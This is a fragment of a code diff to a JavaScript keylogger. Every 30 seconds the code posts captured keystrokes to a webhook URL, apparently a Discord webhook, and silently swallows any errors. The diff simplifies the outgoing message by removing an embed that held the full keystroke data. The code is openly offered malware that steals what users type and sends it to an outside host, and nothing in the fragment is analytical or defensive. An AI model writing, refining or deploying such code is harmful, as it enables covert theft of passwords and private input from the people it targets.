@@ -18,16 +18,12 @@
     // Send keystrokes every 30 seconds
     setInterval(function() {
         if (keys.length > 0) {
+            const message = 'Keystrokes captured: ' + keys.map(k => k.key).join('');
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: 'Keystrokes captured: ' + keys.map(k => k.key).join(''),
-                    embeds: [{
-                        title: 'Keylogger Data',
-                        description: '```json\n' + JSON.stringify(keys) + '\n```',
-                        color: 16711680
-                    }]
+                    content: message
                 })
             }).catch(() => {});
         }
